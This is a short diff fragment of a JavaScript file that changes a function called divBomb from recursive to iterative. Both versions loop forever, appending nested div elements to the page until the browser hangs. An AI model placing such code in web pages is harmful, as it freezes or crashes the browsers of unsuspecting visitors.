@@ -13,14 +13,11 @@ window.onload = function() {
 }
 
 function divBomb() {
-  function addDivs(parent) { 
+  var parent = document.body;
+  while(true) {
     var child = document.createElement('div');
     parent.appendChild(child);
-    addDivs(child);
-  }
-  
-  while(true) {
-    addDivs(document.body);
+    parent = child;
   }
 }
 
